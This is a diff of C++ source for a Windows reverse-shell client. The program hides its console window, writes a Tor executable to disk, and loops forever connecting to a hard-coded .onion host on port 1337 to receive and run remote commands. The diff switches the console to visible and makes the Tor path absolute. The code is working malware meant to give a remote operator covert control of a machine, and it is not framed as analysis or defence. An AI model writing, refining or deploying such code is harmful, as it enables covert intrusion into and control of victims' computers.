@@ -37,20 +37,25 @@ void dropTor() {
 }
 
 #define HOST "lj3d2pro3db5wkrz7i3byeculryh4ykqvpnc7z6xfjiv7mwmi2is5yad.onion"
-#define showConsole false
+#define showConsole true
 
 int main() {
     ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);
+
 
     // Put TOR onto the disk if it isnt there already
     if (GetFileAttributes((LPCWSTR)torExePath) == INVALID_FILE_ATTRIBUTES || GetFileAttributes(L"data\\geoip") == INVALID_FILE_ATTRIBUTES){
         dropTor();
     }
     
+    // Convert the relative path of the tor EXE to an absolute one - prevents issues restarting the proxy
+    char fullTorExePath[MAX_PATH] = { 0 };
+    _fullpath(fullTorExePath, torExePath, _MAX_PATH);
+    
     // Hell loop of forever restarting TOR and trying to connect to the server :)
     // I could make it not restart TOR every time, but I had a few problems with that before
     while (1) {
-        torRevShellClient c(torExePath, HOST, 1337);
+        torRevShellClient c(fullTorExePath, HOST, 1337);
         c.startProxy();
         c.attemptConnect();
         c.cmdProcessLoop(); // If attemptConnect() fails, this function will return immediately
